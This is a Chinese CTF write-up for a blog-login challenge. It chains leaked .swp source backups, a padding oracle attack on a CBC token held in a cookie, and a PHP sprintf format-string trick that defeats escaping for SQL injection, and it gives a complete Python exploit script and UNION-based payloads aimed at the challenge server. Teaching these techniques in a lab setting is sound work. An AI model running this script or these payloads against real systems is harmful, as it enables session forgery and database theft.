### WriteUp

进入题目后可以知道这是一个博客系统，那猜测应该会有后台，扫一下目录或者猜一下可以知道存在`login.php, admin.php`两个文件，访问`admin.php`可以发现有权限控制，访问`login.php`是一个登录界面。

通过尝试可以发现如果随便输入账号密码的话页面返回是`Login failed.`，但是账号密码都输入`admin`的话会跳转到`admin.php`，猜测这里应该是弱口令，只是除了密码以外还有其他的验证方式。

如果扫描字典够强大的话可以扫到`login.php, admin.php`都存在备份文件：`.login.php.swp, .admin.php.swp`

下载备份文件`.login.php.swp`得到源码，源码关键的部分：

```
function get_identity(){
	global $id;
    $token = get_random_token();
    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);
    $_SESSION['id'] = base64_encode($c);
    setcookie("token", base64_encode($token));
    if($id==='admin'){
    	$_SESSION['isadmin'] = 1;
    }else{
    	$_SESSION['isadmin'] = 0;
    }
}

function test_identity(){
    if (isset($_SESSION['id'])) {
        $c = base64_decode($_SESSION['id']);
        $token = base64_decode($_COOKIE["token"]);
        if($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)){
            if ($u === 'admin') {
                $_SESSION['isadmin'] = 1;
                return 1;
            }
        }else{
            die("Error!");
        } 
    }
    return 0;
}
```
可以看到在session中也做了身份验证，但是由于加密模式是`aes-128-cbc`，且`$token`在cookie里，可控，所以这里可以进行**Pading Oracle Attack**，通过修改`$token`可以把`$_SESSION['isadmin']`改为1（如果不清楚**Pading Oracle Attack**的原理的话可以看一下我写过的一篇[博客](http://f1sh.site/2017/08/04/%E5%88%9D%E5%AD%A6padding-oracle-attack/)），这样就成功登录进了`admin.php`。

通过下载`.admin.php.swp`可以得到`admin.php`的源码，发现里面存在数据库操作
```
if(isset($_GET['id'])){
	$id = mysql_real_escape_string($_GET['id']);
	if(isset($_GET['title'])){
		$title = mysql_real_escape_string($_GET['title']);
		$title = sprintf("AND title='%s'", $title);
	}else{
		$title = '';
	}
	$sql = sprintf("SELECT * FROM article WHERE id='%s' $title", $id);
	$result = mysql_query($sql,$con);
	$row = mysql_fetch_array($result);
	if(isset($row['title'])&&isset($row['content'])){
		echo "<h1>".$row['title']."</h1><br>".$row['content'];
		die();
	}else{
		die("This article does not exist.");
	}
```
乍看之下似乎有`mysql_real_escape_string()`所以无法进行注入，但实际上这里可以利用PHP格式化字符串的漏洞。

在PHP的`sprintf`这个函数中`%\`会被当成一个格式化字符串，如图
![](https://i.imgur.com/cSXxM1a.jpg)
可以看到`%\`和`%y`一样被当做了一个不存在的类型的格式化字符串，所以输出为空

所以利用这个原理，我们可以传入`title=%' or 1#`，此时因为`mysql_real_escape_string()`的存在单引号前会被加上一个`\`，那么最后拼接到语句里就是
```
sprintf("SELECT * FROM article WHERE id='%s' AND title='%\' or 1#'", $id);
```
这样`%`就会吃掉后面的`\`组成一个格式化字符串，单引号就成功逃逸了出来。

但是只是这样的话还是会报错参数不足，因为这条代码里有两个格式化字符串但是只有一个参数。不过PHP的格式化字符串还有另一种表示方法`%1$s`，其中`%`后面的数字就表示引用第几个参数，`$`后面是格式化字符串的类型，如图
![](https://i.imgur.com/zIM5IBA.jpg)

所以我们传入`title=%1$' or 1#`，经过转义最后拼接到语句里就是
```
sprintf("SELECT * FROM article WHERE id='%s' AND title='%1$\' or 1#'", $id);
```
这样title那里引用的也是第一个参数`$id`，就不会报参数不足的错了

具体的原理可以看[这篇文章](https://paper.seebug.org/386/)

所以最终SQL注入的payload就是：`?id=0&title=%251%24'%20union%20select%201%2C2%2C3%23`

整个题目可由一个脚本跑出最终flag：
```
#-*- coding:utf-8 -*-

import requests
import base64

url = 'http://111.231.111.54/login.php'
N = 16

def inject_token(token):
    cookie = {"token": token}
    result = s.get(url, cookies = cookie)
    return result

def xor(a, b):
    return "".join([chr(ord(a[i]) ^ ord(b[i%len(b)])) for i in xrange(len(a))])

def pad(string, N):
    l = len(string)
    if l != N:
        return string + chr(N-l) * (N-l)

def padding_oracle(N):
    get = ""
    for i in xrange(1, N):
        for j in xrange(0, 256):
            padding = xor(get, chr(i) * (i - 1))
            c=chr(0) * (16 - i) + chr(j) + padding
            print c.encode('hex')
            result = inject_token(base64.b64encode(c))
            if "<html>" in result.content:
                print result.content
                get = chr(j^i) + get
                break
    return get

data={'username': "admin", 'password': 'admin'}
while 1:
    s = requests.session()
    cookies = s.post(url, data = data, allow_redirects = False).headers['Set-Cookie'].split(',') #获得session和token
    session = cookies[0].split(";")[0][10:]
    token = cookies[1][6:].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')
    middle1 = padding_oracle(N)
    print "\n"
    if(len(middle1) + 1 == 16):
        for i in xrange(0, 256):
            middle = chr(i) + middle1   #padding_oracle只能得到15位，爆破第一位
            print "session: " + session
            print "token: " + token
            print "middle: " + base64.b64encode(middle)
            plaintext = xor(middle, token);
            print "plaintext: " + plaintext
            des = pad('admin', N)
            tmp = ""
            print "padtext: " + base64.b64encode(des)
            for i in xrange(16):
                tmp += chr(ord(token[i]) ^ ord(plaintext[i]) ^ ord(des[i]))
            print "inject_token: " + base64.b64encode(tmp)
            result = inject_token(base64.b64encode(tmp))
            if "css/login.css" not in result.content:
                #payload = "%1$' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#"  #注表名
                #payload = "%1$' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x4b4559#"    #注列名
                payload = "%1$' union select 1,2,f14g from `key`#" #注字段
                params = {'id': '0', 'title': payload}
                r = s.get("http://111.231.111.54/admin.php", params = params)
                print r.content
                print "success"
                exit()
```
注入时也有一个小坑，`key`这个表名是MYSQL保留字，我们把它当做表名带入查询时必须用反引号包起来，不然就会报语法错误而返回不了我们想要的结果。
